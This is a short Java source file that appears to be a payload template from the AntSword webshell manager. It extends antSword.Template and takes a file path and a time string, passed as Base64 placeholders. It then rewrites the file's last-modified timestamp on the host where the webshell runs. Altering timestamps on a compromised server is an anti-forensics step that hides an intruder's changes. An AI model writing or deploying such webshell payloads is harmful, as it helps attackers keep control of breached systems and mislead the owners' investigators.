package filemanager;

import antSword.Template;

import java.io.File;
import java.text.SimpleDateFormat;

public class Retime extends Template {
    @Override
    public String run() throws Exception {
        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
        String z2 = new String(this.Base64DecodeToByte("antswordargtime"), this.cs);
        return ModifyFileOrDirTimeCode(z1, z2);

    }

    String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {
        File f = new File(fileOrDirPath);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(aTime);
        f.setLastModified(dt.getTime());
        return "1";
    }
}
